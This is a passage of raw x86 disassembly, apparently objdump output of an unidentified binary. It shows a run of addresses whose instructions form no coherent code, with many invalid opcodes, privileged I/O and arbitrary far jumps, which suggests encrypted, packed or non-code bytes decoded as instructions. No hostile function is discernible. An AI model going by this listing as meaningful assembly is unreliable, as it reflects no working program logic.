  40bac7:	mov    dh,0x55
  40bac9:	inc    ebp
  40baca:	push   ss
  40bacb:	hlt    
  40bacc:	add    WORD PTR [ecx-0x44],di
  40bad0:	xchg   ebx,eax
  40bad1:	inc    edi
  40bad2:	jg     0x40bb29
  40bad4:	fiadd  DWORD PTR [eax+ebp*2+0x7ee6b17a]
  40badb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40badc:	in     eax,0xe6
  40bade:	sub    cl,BYTE PTR [ecx+ecx*2]
  40bae1:	push   0xb50c665b
  40bae6:	aaa    
  40bae7:	xor    al,0xc1
  40bae9:	push   eax
  40baea:	mov    ch,0x2
  40baec:	pushf  
  40baed:	test   al,0xf8
  40baef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40baf0:	gs int 0xb4
  40baf3:	mov    al,0x66
  40baf5:	fild   DWORD PTR [esi-0x61ae0fdd]
  40bafb:	lds    esi,FWORD PTR [ecx-0x728610c2]
  40bb01:	xchg   DWORD PTR [eax+0x57a43080],ebx
  40bb07:	xor    DWORD PTR [ebp+0x546fb394],ebp
  40bb0d:	jno    0x40bab6
  40bb0f:	mov    eax,ds:0x785828d7
  40bb14:	jne    0x40ba9b
  40bb16:	add    eax,0x19062704
  40bb1b:	push   es
  40bb1c:	xor    ch,BYTE PTR [esi-0x5a2a2a05]
  40bb22:	xchg   edx,eax
  40bb23:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bb24:	lods   al,BYTE PTR ds:[esi]
  40bb25:	xor    eax,0x944ba720
  40bb2a:	icebp  
  40bb2b:	inc    eax
  40bb2c:	dec    ecx
  40bb2d:	retf   
  40bb2e:	mov    dl,0xb
  40bb30:	mov    esp,0x258b8c09
  40bb35:	lods   eax,DWORD PTR ds:[esi]
  40bb36:	push   ebp
  40bb37:	mov    eax,0x1e8ea38f
  40bb3c:	sbb    DWORD PTR [esp+eiz*4-0x1b],0xc9b0693
  40bb44:	addr16 adc eax,ebp
  40bb47:	fcom   QWORD PTR [esi]
  40bb49:	or     eax,0xda29d1ac
  40bb4e:	icebp  
  40bb4f:	or     al,0xcd
  40bb51:	cli    
  40bb52:	fdivr  DWORD PTR [ecx-0x54]
  40bb55:	sub    esp,DWORD PTR ds:0x9d7f4e66
  40bb5b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bb5c:	cmp    ch,BYTE PTR [eax-0x2ae68590]
  40bb62:	mov    ebx,0x1d2805be
  40bb67:	sahf   
  40bb68:	pop    ds
  40bb69:	fld    TBYTE PTR [ecx]
  40bb6b:	outs   dx,DWORD PTR ds:[esi]
  40bb6c:	dec    ecx
  40bb6d:	push   ss
  40bb6e:	push   ebp
  40bb6f:	int3   
  40bb70:	jecxz  0x40bbb7
  40bb72:	add    BYTE PTR [ebp-0x236300ff],0x88
  40bb79:	cli    
  40bb7a:	rcl    BYTE PTR [ecx-0x541b2075],cl
  40bb80:	add    DWORD PTR [esi],eax
  40bb82:	idiv   ebx
  40bb84:	sar    edi,0xce
  40bb87:	test   ah,ch
  40bb89:	sbb    ebp,DWORD PTR [ecx]
  40bb8b:	and    DWORD PTR [ebx],ecx
  40bb8d:	dec    ecx
  40bb8e:	mov    dh,dl
  40bb90:	mov    ebx,0x5a952b36
  40bb95:	sub    eax,0xeba5edad
  40bb9a:	loop   0x40bb93
  40bb9c:	pushf  
  40bb9d:	sub    al,0x50
  40bb9f:	loop   0x40bb3b
  40bba1:	xchg   esp,eax
  40bba2:	inc    esi
  40bba3:	dec    ebx
  40bba4:	outs   dx,DWORD PTR ds:[esi]
  40bba5:	cmp    eax,0xb11705e4
  40bbaa:	outs   dx,BYTE PTR ds:[esi]
  40bbab:	or     eax,0x47be48a0
  40bbb0:	in     eax,dx
  40bbb1:	imul   eax,edx,0xfffffff2
  40bbb4:	jnp    0x40bb87
  40bbb6:	icebp  
  40bbb7:	loope  0x40bb52
  40bbb9:	inc    eax
  40bbba:	test   al,0x75
  40bbbc:	ror    edx,cl
  40bbbe:	(bad)  
  40bbbf:	dec    ebx
  40bbc0:	xchg   edx,eax
  40bbc1:	outs   dx,DWORD PTR ds:[esi]
  40bbc2:	mov    esp,0xa13b641a
  40bbc7:	adc    eax,0x37280118
  40bbcc:	mov    dh,0x95
  40bbce:	mov    BYTE PTR [edi-0x12],dh
  40bbd1:	sub    cl,bh
  40bbd3:	data16 sbb dh,BYTE PTR [ebx+0x2e]
  40bbd7:	sbb    al,0xcb
  40bbd9:	push   0xfffffff3
  40bbdb:	repnz mov ecx,0x6b484baa
  40bbe1:	ret    
  40bbe2:	clc    
  40bbe3:	sbb    al,0xb4
  40bbe5:	inc    edx
  40bbe6:	push   cs
  40bbe7:	sbb    esi,ebp
  40bbe9:	dec    eax
  40bbea:	cld    
  40bbeb:	mov    esp,gs
  40bbed:	scas   eax,DWORD PTR es:[edi]
  40bbee:	ja     0x40bbdd
  40bbf0:	clc    
  40bbf1:	outs   dx,BYTE PTR ds:[esi]
  40bbf2:	mov    al,0x5c
  40bbf4:	pop    edx
  40bbf5:	in     al,dx
  40bbf6:	and    al,0x26
  40bbf8:	lock inc DWORD PTR [edx-0x41]
  40bbfc:	sub    bl,BYTE PTR [eax-0x6ac00b44]
  40bc02:	mov    ds:0xf09f7e01,al
  40bc07:	jmp    0x754ce3ed
  40bc0c:	jge    0x40bbb5
  40bc0e:	mov    ?,esi
  40bc10:	mov    eax,ds:0xa3be7703
  40bc15:	fdiv   st(7),st
  40bc17:	cwde   
  40bc18:	ds mov edx,0xbb0240ef
  40bc1e:	loopne 0x40bbb4
  40bc20:	mov    ds:0x5eb205fd,eax
  40bc25:	cld    
  40bc26:	sbb    al,0x94
  40bc28:	xchg   esp,eax
  40bc29:	push   edi
  40bc2a:	retf   
  40bc2b:	out    0xf6,eax
  40bc2d:	test   al,0xcf
  40bc2f:	inc    esi
  40bc30:	push   0x2f
  40bc32:	mov    cl,BYTE PTR [edi]
  40bc34:	cmp    bl,BYTE PTR [eax+0x64632ef3]
  40bc3a:	xor    BYTE PTR fs:[esi],bl
  40bc3d:	mov    dl,0x92
  40bc3f:	scas   eax,DWORD PTR es:[edi]
  40bc40:	adc    al,0xe9
  40bc42:	dec    edx
  40bc43:	pop    edi
  40bc44:	sahf   
  40bc45:	ins    BYTE PTR es:[edi],dx
  40bc46:	lods   al,BYTE PTR ds:[esi]
  40bc47:	jnp    0x40bc20
  40bc49:	fs retf 0x8906
  40bc4d:	loop   0x40bc04
  40bc4f:	test   al,0x57
  40bc51:	cmp    al,0xc1
  40bc53:	in     al,0x98
  40bc55:	cmp    esp,DWORD PTR [edx]
  40bc57:	inc    ebp
  40bc58:	mov    al,ds:0x3da04572
  40bc5d:	hlt    
  40bc5e:	pushf  
  40bc5f:	fwait
  40bc60:	es call 0xa532:0x9af632dd
  40bc68:	or     al,dh
  40bc6a:	(bad)
  40bc6d:	cmp    dh,BYTE PTR [esi+0x7d7d7411]
  40bc73:	dec    edi
  40bc74:	cmp    BYTE PTR [ebx+ebp*4],cl
  40bc77:	shr    ah,1
  40bc79:	out    0x2d,al
  40bc7b:	adc    eax,eax
  40bc7d:	mov    esi,0x12a4316c
  40bc82:	not    edi
  40bc84:	mov    dh,0x4
  40bc86:	push   eax
  40bc87:	mov    ch,bl
  40bc89:	retf   0x6188
  40bc8c:	shr    BYTE PTR [ebp+0x4d193c66],cl
  40bc92:	jp     0x40bcd7
  40bc94:	call   0x98fd:0xc96c23b1
  40bc9b:	jl     0x40bcb7
  40bc9d:	out    0x92,eax
  40bc9f:	gs (bad) 
  40bca1:	mov    cl,0x9d
  40bca3:	jns    0x40bce2
  40bca5:	add    al,0x87
  40bca7:	pop    ebp
  40bca8:	nop
  40bca9:	int    0xf
  40bcab:	mov    ch,0xf8
  40bcad:	adc    al,0x71
  40bcaf:	cdq    
  40bcb0:	add    BYTE PTR [edx],ah
  40bcb2:	inc    ecx
  40bcb3:	or     ax,0x90f2
  40bcb7:	rcr    BYTE PTR [eax-0x63],cl
  40bcba:	shl    eax,0x3d
  40bcbd:	pop    es
  40bcbe:	jmp    0x40bc7d
  40bcc0:	push   cs
  40bcc1:	sub    al,dl
  40bcc3:	xchg   ecx,eax
  40bcc4:	push   esi
  40bcc5:	xor    DWORD PTR [edx],esi
  40bcc7:	add    bl,bl
  40bcc9:	leave  
  40bcca:	js     0x40bc6e
  40bccc:	adc    eax,0x5ee45609
  40bcd1:	mov    edi,0x46445705
  40bcd6:	ins    BYTE PTR es:[edi],dx
  40bcd7:	call   0x2e48:0x28945811
  40bcde:	add    cl,bh
  40bce0:	lock jmp 0xd7a5:0xb42e4b45
  40bce8:	out    dx,al
  40bce9:	mov    al,0x22
  40bceb:	pop    ss
  40bcec:	(bad)  
  40bced:	int3   
  40bcee:	aaa    
  40bcef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bcf0:	sbb    dl,BYTE PTR [edi-0x4b]
  40bcf3:	mov    edi,0x75c6e81
  40bcf8:	xchg   ecx,eax
  40bcf9:	pop    es
  40bcfa:	jle    0x40bca5
  40bcfc:	xchg   ebp,eax
  40bcfd:	je     0x40bd28
  40bcff:	arpl   WORD PTR [ebx-0x53b771f2],cx
  40bd05:	lea    eax,[edx-0x2c4d7c11]
  40bd0b:	imul   ebp,DWORD PTR [edi-0x477736a8],0x30de2ea9
  40bd15:	inc    ebx
  40bd16:	add    ah,BYTE PTR [ecx+0x763ed6cf]
  40bd1c:	mov    BYTE PTR [ecx],0x9b
  40bd1f:	sub    esi,DWORD PTR [edx+0xf]
  40bd22:	pop    ds
  40bd23:	jne    0x40bd09
  40bd25:	mov    bl,0x38
  40bd27:	pop    edx
  40bd28:	test   al,0x70
  40bd2a:	imul   eax,DWORD PTR [ecx-0x35],0xc05be26e
  40bd31:	mov    cl,BYTE PTR [ebp+eiz*8-0x70]
  40bd35:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bd36:	pop    esi
  40bd37:	cdq    
  40bd38:	(bad)  
  40bd39:	clc    
  40bd3a:	pop    ds
  40bd3b:	les    eax,FWORD PTR [eax]
  40bd3d:	adc    eax,DWORD PTR [esi+edx*2-0x9]
  40bd41:	push   ss
  40bd42:	clc    
  40bd43:	and    al,0x5e
  40bd45:	push   ss
  40bd46:	test   eax,0xd861ab51
  40bd4b:	hlt    
  40bd4c:	rcr    DWORD PTR [esi-0x5d],cl
  40bd4f:	inc    eax
  40bd50:	les    esp,FWORD PTR [eax-0x379b1678]
  40bd56:	mov    eax,ds:0xd25422cc
  40bd5b:	sub    DWORD PTR [ebx],ebp
  40bd5d:	(bad)
  40bd62:	pop    ss
  40bd63:	cs inc eax
  40bd65:	fyl2x  
  40bd67:	adc    BYTE PTR [eax+0xf0e5663],0x40
  40bd6e:	scas   al,BYTE PTR es:[edi]
  40bd6f:	rcl    BYTE PTR [esi-0x5d0afd41],cl
  40bd75:	cmp    ah,0xe1
  40bd78:	and    bh,BYTE PTR [ecx+ebx*1+0x73]
  40bd7c:	push   ebx
  40bd7d:	mov    bl,0xe3
  40bd7f:	pop    ebx
  40bd80:	push   esi
  40bd81:	enter  0x273,0xf0
  40bd85:	xchg   BYTE PTR [ecx],ah
  40bd87:	inc    esp
  40bd88:	jg     0x40bddf
  40bd8a:	mov    bl,0xc9
  40bd8c:	xchg   esp,eax
  40bd8d:	xor    DWORD PTR ss:0x2617d0ba,ebx
  40bd94:	pop    esi
  40bd95:	sub    dh,dl
  40bd97:	or     esp,ebx
  40bd99:	cwde   
  40bd9a:	aaa    
  40bd9b:	sbb    ebx,DWORD PTR [ecx]
  40bd9d:	das    
  40bd9e:	xchg   esi,eax
  40bd9f:	push   esi
  40bda0:	mov    ebp,0xaffbbef3
  40bda5:	out    0x68,eax
  40bda7:	cmp    dl,BYTE PTR [eax+0x9393401]
  40bdad:	sbb    edx,ebp
  40bdaf:	rcl    BYTE PTR [eax-0x4b],1
  40bdb2:	mov    ebx,DWORD PTR [ecx+0xe]
  40bdb5:	sub    DWORD PTR [esi],eax
  40bdb7:	cwde   
  40bdb8:	xor    ebx,edx
  40bdba:	jl     0x40bdb9
  40bdbc:	int    0xec
  40bdbe:	cmp    BYTE PTR [edx+0x78],bh
  40bdc1:	fmul   QWORD PTR [ecx+ecx*1-0x10]
  40bdc5:	inc    esi
  40bdc6:	jno    0x40bdab
  40bdc8:	mov    es,WORD PTR [ebp+0x4b]
  40bdcb:	jo     0x40be33
  40bdcd:	call   0xe32b381a
  40bdd2:	inc    ebx
  40bdd3:	retf   0x2538
  40bdd6:	adc    ecx,DWORD PTR [esi+0x44d95451]
  40bddc:	pop    ebp
  40bddd:	fwait
  40bdde:	inc    esi
  40bddf:	push   ebx
  40bde0:	fimul  DWORD PTR [edx-0x21]
  40bde3:	push   0x733e3bb3
  40bde8:	(bad)  
  40bdeb:	out    0xba,al
  40bded:	retf   0x862f
  40bdf0:	inc    esi
  40bdf1:	dec    ebx
  40bdf2:	cdq    
  40bdf3:	in     eax,dx
  40bdf4:	mov    bh,0x8c
  40bdf6:	sub    edx,DWORD PTR [esi*2+0x3e06dd7f]
  40bdfd:	not    BYTE PTR [ebx]
  40bdff:	push   ecx
  40be00:	mov    esi,0x32ba0cd
  40be05:	cli    
  40be06:	lahf   
  40be07:	sbb    ebx,eax
  40be09:	mov    dh,0xcb
  40be0b:	jbe    0x40be69
  40be0d:	add    eax,0xae632be0
  40be13:	push   cs
  40be14:	mov    dl,0x14
  40be16:	mov    es,WORD PTR [ecx+0x38]
  40be19:	int    0xf3
  40be1b:	mov    esp,0x14989144
  40be20:	cs (bad) 
  40be22:	cwde   
  40be23:	lds    esi,FWORD PTR [ebx]
  40be25:	xor    eax,0x7f53c0a4
  40be2a:	mov    ds:0xdce58981,al
  40be2f:	(bad)  
  40be31:	mov    dl,0xdc
  40be33:	inc    edx
  40be34:	adc    eax,0x7d6e3543
  40be39:	dec    edx
  40be3a:	push   eax
  40be3b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40be3c:	push   cs
  40be3d:	mov    BYTE PTR es:[ecx],al
  40be40:	xor    edx,DWORD PTR [esi]
  40be42:	test   eax,0xba25e07
  40be47:	cmc    
  40be48:	fadd   QWORD PTR [ebx-0x64a95ad3]
  40be4e:	ss push 0xc
  40be51:	push   ss
  40be52:	push   ss
  40be53:	pop    es
  40be54:	ja     0x40be33
  40be56:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40be57:	fld    TBYTE PTR [ecx+eiz*1+0x6633d967]
  40be5e:	xor    edx,0xf0d3fbf0
  40be64:	xor    DWORD PTR [esi-0x22],edi
  40be67:	sbb    ecx,DWORD PTR fs:[eax]
  40be6a:	jle    0x40be74
  40be6c:	cdq    
  40be6d:	xor    al,0x82
  40be6f:	add    eax,0x9277d49a
  40be74:	sub    al,0x99
  40be76:	out    0x3c,eax
  40be78:	xchg   ecx,eax
  40be79:	xchg   bl,bh
  40be7b:	call   0x89b0ad2a
  40be80:	mov    edi,0x9778ee77
  40be85:	lods   eax,DWORD PTR ds:[esi]
  40be86:	ffree  st(3)
  40be88:	jmp    DWORD PTR ds:0x8e42965b
  40be8e:	adc    eax,0x70e7c355
  40be93:	mov    eax,ss:0x3dcc124
  40be99:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40be9a:	jbe    0x40bee0
  40be9c:	fisttp WORD PTR [ebp-0xeff69ca]
  40bea2:	sbb    DWORD PTR cs:[eax],ebx
  40bea5:	into   
  40bea6:	mov    dl,0x1e
  40bea8:	add    bl,BYTE PTR [ebx-0x5f]
  40beab:	push   ecx
  40beac:	mov    DWORD PTR [edi+0x7ffd3d23],ebx
  40beb2:	inc    esi
  40beb3:	ins    DWORD PTR es:[edi],dx
  40beb4:	xor    DWORD PTR [ebx+0x637e1ed2],0x7170e631
  40bebe:	cwde   
  40bebf:	cmp    ecx,edi
  40bec1:	loopne 0x40be75
  40bec3:	ficomp WORD PTR [esi-0x526c0e7c]
  40bec9:	push   0x5c
  40becb:	je     0x40becf
  40becd:	repz dec esi
  40becf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bed0:	xor    eax,0x25a4da8e
  40bed5:	aad    0xed
  40bed7:	and    cl,dh
  40bed9:	and    ecx,eax
  40bedb:	mov    dl,0xe2
  40bedd:	shr    DWORD PTR [ebx],cl
  40bedf:	scas   al,BYTE PTR es:[edi]
  40bee0:	test   eax,0x71783e55
  40bee5:	pop    ss
  40bee6:	dec    esp
  40bee7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bee8:	lods   eax,DWORD PTR ds:[esi]
  40bee9:	fucomp st(5)
  40beeb:	jae    0x40bef7
  40beed:	aas    
  40beee:	inc    edx
  40beef:	jnp    0x40bedc
  40bef1:	mov    WORD PTR [ecx-0x14],?
  40bef4:	aad    0xe4
  40bef6:	outs   dx,DWORD PTR ds:[esi]
  40bef7:	sub    bh,bh
  40bef9:	(bad)  
  40befb:	jecxz  0x40bea3
  40befd:	and    eax,DWORD PTR [edi+0x5aa95d86]
  40bf03:	mov    al,0xa4
  40bf05:	adc    eax,0xaf06bc6e
  40bf0a:	lahf   
  40bf0b:	or     DWORD PTR ds:0x78523cbb,ecx
  40bf11:	inc    ecx
  40bf12:	fisubr WORD PTR [edx-0x22]
  40bf15:	jge    0x40bf64
  40bf17:	inc    eax
  40bf18:	jg     0x40bf50
  40bf1a:	shr    DWORD PTR [esi+0x12f9b746],cl
  40bf20:	mov    bh,0x40
  40bf22:	scas   eax,DWORD PTR es:[edi]
  40bf23:	jno    0x40bf72
  40bf25:	and    BYTE PTR [ebp-0x49f7805a],bh
  40bf2b:	lds    ebp,FWORD PTR cs:[ebx-0x17]
  40bf2f:	mov    ecx,0x6557bdfc
  40bf34:	rol    BYTE PTR [esi+0x57533846],cl
  40bf3a:	leave  
  40bf3b:	je     0x40bedb
  40bf3d:	and    bh,ah
  40bf3f:	xchg   ecx,eax
  40bf40:	mov    al,0x42
  40bf42:	es inc edx
  40bf44:	mov    ebp,0xb4b71fd1
  40bf49:	mov    eax,ds:0x3b2076c2
  40bf4e:	jg     0x40bf5b
  40bf50:	lods   eax,DWORD PTR ds:[esi]
  40bf51:	or     edi,DWORD PTR [edx-0x3d50f58b]
  40bf57:	imul   esp,ebx,0xa1ca62c6
  40bf5d:	jne    0x40beff
  40bf5f:	or     edi,0x16e70999
  40bf65:	and    al,0xc
  40bf67:	aam    0x3
  40bf69:	cmp    ebp,DWORD PTR [ebx]
  40bf6b:	mov    eax,ds:0x9886fba7
  40bf70:	push   0xeb56a57e
  40bf75:	mov    WORD PTR [ebx+0x74],gs
  40bf78:	repz fstp DWORD PTR [ecx+esi*2+0x21]
  40bf7d:	int    0x6a
  40bf7f:	(bad)  
  40bf80:	mov    edi,0x9d61d1cc
  40bf85:	rcl    DWORD PTR [edx],1
  40bf87:	imul   edx,DWORD PTR [esi-0x52],0xffffff83
  40bf8b:	(bad)  
  40bf8d:	(bad)  
  40bf8e:	cmc    
  40bf8f:	in     al,0x46
  40bf91:	pusha  
  40bf92:	stos   BYTE PTR es:[edi],al
  40bf93:	pop    ebp
  40bf94:	mov    cl,0x16
  40bf96:	fstp   DWORD PTR [ebx]
  40bf98:	mov    ebp,0xf7c9ceb5
  40bf9d:	xlat   BYTE PTR ds:[ebx]
  40bf9e:	dec    edi
  40bf9f:	bound  ebx,QWORD PTR [ecx-0x55a9bb0b]
  40bfa5:	(bad)  
  40bfa6:	(bad)  
  40bfa7:	push   edx
  40bfa8:	cs xchg edi,eax
  40bfaa:	lods   al,BYTE PTR ds:[esi]
  40bfab:	jns    0x40bf68
  40bfad:	lods   eax,DWORD PTR ds:[esi]
  40bfae:	lock (bad) 
  40bfb0:	ja     0x40bff8
  40bfb2:	retf   
  40bfb3:	jmp    0x328a:0x2abbbf12
  40bfba:	test   BYTE PTR ds:0xca012fe5,cl
  40bfc0:	shl    eax,0x4d
  40bfc3:	scas   eax,DWORD PTR es:[edi]
  40bfc4:	sbb    DWORD PTR [ebp-0x1b],eax
  40bfc7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bfc8:	fs sti 
  40bfca:	push   ecx
  40bfcb:	fisub  DWORD PTR [edi]
  40bfcd:	push   ebx
  40bfce:	mov    eax,ds:0x88536b8c
  40bfd3:	std    
  40bfd4:	lds    ebp,FWORD PTR [esi+0x2b]
  40bfd7:	int3   
  40bfd8:	or     BYTE PTR [ebx+esi*2-0x3d4582d],0x62
  40bfe0:	mov    esp,0xc5c468fe
  40bfe5:	test   al,0xe
  40bfe7:	sbb    eax,0x19b58e18
  40bfec:	push   eax
  40bfed:	cld    
  40bfee:	retf   0x25de
  40bff1:	mov    esi,0x9d884f00
  40bff6:	jno    0x40bfcd
  40bff8:	nop
  40bff9:	sbb    eax,0xc93686f2
  40bffe:	and    al,0x94
  40c000:	and    BYTE PTR [esi],ah
  40c002:	dec    esi
  40c003:	retf   0xa7f8
  40c006:	jmp    0x9bd8a51d
  40c00b:	imul   eax,DWORD PTR [edx+edx*8-0x1ac9a34e],0xffffffb7
  40c013:	xor    ch,ch
  40c015:	aam    0x3b
  40c017:	aad    0xd6
  40c019:	in     al,dx
  40c01a:	ins    DWORD PTR es:[edi],dx
  40c01b:	scas   eax,DWORD PTR es:[edi]
  40c01c:	loopne 0x40c092
  40c01e:	or     eax,0xabd5d45f
  40c023:	and    bl,al
  40c025:	sbb    DWORD PTR [edx+edi*8+0x47413855],edi
  40c02c:	repnz mov al,0xfe
  40c02f:	ds pop ds
  40c031:	jbe    0x40c0ac
  40c033:	scas   eax,DWORD PTR es:[edi]
  40c034:	daa    
  40c035:	mov    ecx,0xc5656ea3
  40c03a:	inc    ebx
  40c03b:	retf   
  40c03c:	jbe    0x40c0a0
  40c03e:	(bad)  [ecx+0x2c9c2edc]
  40c044:	inc    edi
  40c045:	add    BYTE PTR [eax],bh
  40c047:	scas   al,BYTE PTR es:[edi]
  40c048:	in     eax,dx
  40c049:	dec    edi
  40c04a:	mov    esp,0x92b6b8c8
  40c04f:	stos   BYTE PTR es:[edi],al
  40c050:	add    eax,DWORD PTR [ebx]
  40c052:	add    eax,ebp
  40c054:	cmp    bl,ah
  40c056:	call   0x6ec8:0xe24b8c04
  40c05d:	mov    BYTE PTR [esp+eax*1],bl
  40c060:	mov    ebx,DWORD PTR [ebp-0x8]
  40c063:	push   0x5f
  40c065:	stos   DWORD PTR es:[edi],eax
  40c066:	adc    ebx,DWORD PTR [eax]
  40c068:	rcr    BYTE PTR [edi+0x61],cl
  40c06b:	xlat   BYTE PTR ds:[ebx]
  40c06c:	push   es
  40c06d:	(bad)  
  40c06e:	mov    ?,edi
  40c070:	das    
  40c071:	sbb    eax,0x10d68a60
  40c076:	mov    ecx,0x53c68638
  40c07b:	push   ecx
  40c07c:	gs mov ebx,0x86e432d7
  40c082:	adc    eax,0xa9fa9ef5
  40c087:	nop
  40c088:	and    cl,dh
  40c08a:	mov    ebp,0x690f054a
  40c08f:	cmc    
  40c090:	int3   
  40c091:	pushf  
  40c092:	ss pop eax
  40c094:	sub    DWORD PTR [ebx-0x2016b5b0],edx
  40c09a:	hlt    
  40c09b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c09c:	fidivr WORD PTR [edx-0x100b1db5]
  40c0a2:	stc    
  40c0a3:	cmp    al,0xa2
  40c0a5:	popa   
  40c0a6:	xchg   ecx,eax
  40c0a7:	cwde   
  40c0a8:	outs   dx,DWORD PTR ds:[esi]
  40c0a9:	scas   eax,DWORD PTR es:[edi]
  40c0aa:	out    0xc7,eax
  40c0ac:	fisub  WORD PTR [ebx-0x73]
  40c0af:	test   eax,0xf98abd26
  40c0b4:	xchg   dx,ax
  40c0b6:	xor    al,0x60
  40c0b8:	cmp    al,0x5a
  40c0ba:	xor    al,0xc1
  40c0bc:	iret   
  40c0bd:	mov    bl,BYTE PTR [ecx+0x508955f0]
  40c0c3:	nop
  40c0c4:	adc    DWORD PTR [edi+esi*1],0x84df3f4a
  40c0cb:	das    
  40c0cc:	sahf   
  40c0cd:	cmc    
  40c0ce:	sub    eax,0x65a17752
  40c0d3:	dec    edx
  40c0d4:	call   0x6cd978ea
  40c0d9:	repnz fwait
  40c0db:	shl    BYTE PTR [eax],0x3f
  40c0de:	enter  0x91c7,0x42
  40c0e2:	daa    
  40c0e3:	lods   eax,DWORD PTR ds:[esi]
  40c0e4:	leave  
  40c0e5:	dec    edi
  40c0e6:	repz fs aaa 
  40c0e9:	data16 sahf 
  40c0eb:	jno    0x40c0e5
  40c0ed:	fidiv  WORD PTR [ebx+0x112319c2]
  40c0f3:	lea    edx,gs:[ebx+0x4134b5ce]
  40c0fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c0fb:	add    BYTE PTR [esi],0x1f
  40c0fe:	and    al,0x2c
  40c100:	xchg   ecx,eax
  40c101:	adc    al,0xca
  40c103:	mov    dl,0xbb
  40c105:	push   ebp
  40c106:	push   ecx
  40c107:	or     ebx,edx
  40c109:	or     bl,bh
  40c10b:	je     0x40c115
  40c10d:	popf   
  40c10e:	aad    0xeb
  40c110:	outs   dx,BYTE PTR ds:[esi]
  40c111:	mov    al,ds:0x5a473893
  40c116:	mov    ch,0xe8
  40c118:	pop    ds
  40c119:	cmp    eax,0xc09b4819
  40c11e:	push   ebp
  40c11f:	mov    ds:0xd662e11,al
  40c124:	rcr    BYTE PTR [esi+0x5c6259bc],0x33
  40c12b:	out    dx,al
  40c12c:	xor    bh,dl
  40c12e:	ds hlt 
  40c130:	outs   dx,BYTE PTR ds:[esi]
  40c131:	rcl    BYTE PTR [eax-0x3d84f2d9],0x85
  40c138:	xchg   eax,esp
  40c13a:	out    0x8f,al
  40c13c:	xor    dl,BYTE PTR [eax]
  40c13e:	outs   dx,BYTE PTR ds:[esi]
  40c13f:	and    al,0xf3
  40c141:	ret    0x4254
  40c144:	daa    
  40c145:	jo     0x40c175
  40c147:	lock mov cl,0x7b
  40c14a:	idiv   ch
  40c14c:	test   BYTE PTR [edi-0x4c36bbf8],ch
  40c152:	das    
  40c153:	das    
  40c154:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c155:	or     dl,ch
  40c157:	imul   ebp,ecx,0xd
  40c15a:	(bad)  
  40c15b:	sub    DWORD PTR [eax+ebx*1],ebp
  40c15e:	es mov ecx,ss
  40c161:	push   cs
  40c162:	dec    ebp
  40c163:	dec    DWORD PTR [ebx+eax*1+0x68]
  40c167:	mov    eax,ds:0x44da3c59
  40c16c:	or     eax,DWORD PTR [ecx+0x78]
  40c16f:	or     ecx,esp
  40c171:	fwait
  40c172:	out    0x2c,eax
  40c174:	shr    ebx,1
  40c176:	cmp    DWORD PTR [edi-0x7c],ebx
  40c179:	ror    DWORD PTR [ebp-0x39753e22],1
  40c17f:	mov    esi,ecx
  40c181:	sahf   
  40c182:	and    al,0xdd
  40c184:	out    0x11,al
  40c186:	sbb    DWORD PTR [eax-0x6ba0245c],esi
  40c18c:	inc    esi
  40c18d:	push   edx
  40c18e:	xor    edx,ebp
  40c190:	pop    es
  40c191:	aad    0x5a
  40c193:	jl     0x40c206
  40c195:	cli    
  40c196:	in     eax,dx
  40c197:	or     esp,DWORD PTR [esi]
  40c199:	outs   dx,BYTE PTR ds:[esi]
  40c19a:	int3   
  40c19b:	push   esi
  40c19c:	repnz mov ah,0x6f
  40c19f:	cmc    
  40c1a0:	pusha  
  40c1a1:	cdq    
  40c1a2:	es cs test dl,cl
  40c1a6:	xchg   esi,eax
  40c1a7:	cs dec eax
  40c1a9:	push   esp
  40c1aa:	int    0x66
  40c1ac:	push   es
  40c1ad:	xor    eax,0x12a0bc01
  40c1b2:	pop    es
  40c1b3:	cmc    
  40c1b4:	add    al,0x71
  40c1b6:	into   
  40c1b7:	add    BYTE PTR [edi+0x3e3e931e],0xe3
  40c1be:	sub    BYTE PTR [edx+edx*8+0x1abcdfbb],ch
  40c1c5:	pop    es
  40c1c6:	addr16 jno 0x40c153
  40c1c9:	lods   eax,DWORD PTR ds:[esi]
  40c1ca:	adc    eax,edx
  40c1cc:	stc    
  40c1cd:	loop   0x40c1f9
  40c1cf:	lods   eax,DWORD PTR ds:[esi]
  40c1d0:	adc    eax,0x9a085b7c
  40c1d5:	jg     0x40c240
  40c1d7:	and    DWORD PTR [ebx+0x79],0x8c4e5988
  40c1de:	add    DWORD PTR [esi+ebp*1],ecx
  40c1e1:	add    DWORD PTR [edx+0x118c9818],eax
  40c1e7:	retf   
  40c1e8:	loope  0x40c1c1
  40c1ea:	rol    ecx,1
  40c1ec:	push   ebx
  40c1ed:	push   ebp
  40c1ee:	mov    ecx,0x4ccaaf84
  40c1f3:	jg     0x40c1cd
  40c1f5:	push   eax
  40c1f6:	repnz lods al,BYTE PTR ds:[esi]
  40c1f8:	cs jecxz 0x40c1b7
  40c1fb:	sub    bl,BYTE PTR [esi+edx*4-0x45]
  40c1ff:	repz sub eax,ebp
  40c202:	ds mov edi,0xa62fd763
  40c208:	xchg   ebx,eax
  40c209:	mov    eax,ds:0xea3ff0fe
  40c20e:	or     al,0xa8
  40c210:	dec    edx
  40c211:	lock sahf 
  40c213:	jp     0x40c280
  40c215:	js     0x40c22f
  40c217:	xlat   BYTE PTR ds:[ebx]
  40c218:	mov    WORD PTR [ebx],gs
  40c21a:	push   DWORD PTR [esi+0x11c74f84]
  40c220:	fst    DWORD PTR [ecx+eiz*2]
  40c223:	pop    ebx
  40c224:	push   0x5e65b8a6
  40c229:	sbb    eax,0x618de399
  40c22e:	mov    esp,0x7b54f56e
  40c233:	into   
  40c234:	shl    DWORD PTR [ecx+0x20],1
  40c237:	xchg   edx,eax
